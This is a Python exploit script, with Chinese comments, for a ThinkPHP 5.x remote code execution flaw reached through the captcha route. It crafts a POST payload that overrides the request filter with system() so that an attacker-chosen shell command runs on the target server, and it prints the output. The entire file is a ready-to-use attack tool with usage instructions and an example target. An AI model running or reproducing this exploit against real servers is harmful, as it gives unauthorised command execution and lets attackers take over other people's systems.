#!/usr/bin/env python3
"""
ThinkPHP 5.x Remote Code Execution (captcha route)
CVE-2018-20062 / ThinkPHP <= 5.0.23 RCE
Usage: python thinkphp_rce.py http://target/index.php [command]
"""

import requests
import sys

def execute_command(target_url, cmd="id"):
    """
    发送恶意 POST 请求执行命令。
    :param target_url: 目标 URL，如 http://example.com/index.php
    :param cmd: 要执行的系统命令
    """
    # 确保 URL 包含 index.php?s=captcha
    base = target_url.rstrip("/")
    if "?" not in base:
        url = base + "/index.php?s=captcha"
    else:
        # 如果已有参数，尝试替换或拼接
        if "s=captcha" not in base:
            url = base + "&s=captcha" if "?" in base else base + "?s=captcha"
        else:
            url = base

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Connection": "close"
    }

    # 构造 payload：_method=__construct 调用构造方法覆盖 filter 属性
    data = {
        "_method": "__construct",
        "filter[]": "system",
        "method": "get",
        "server[REQUEST_METHOD]": cmd
    }

    try:
        resp = requests.post(url, headers=headers, data=data, timeout=10)
        # 命令执行无回显的情况，但 ThinkPHP 调试模式下可能直接输出
        # 如果目标没有开启调试，命令执行结果可能无法直接返回，但可以通过 DNS 日志或文件落地验证
        print(f"[*] Response status: {resp.status_code}")
        if resp.text:
            print("[+] Response body:")
            print(resp.text)
        else:
            print("[!] Empty response, command may have executed blindly.")
    except Exception as e:
        print(f"[-] Connection failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [command]")
        print(f"Example: {sys.argv[0]} http://192.168.1.100/index.php id")
        sys.exit(1)

    target = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
    execute_command(target, cmd)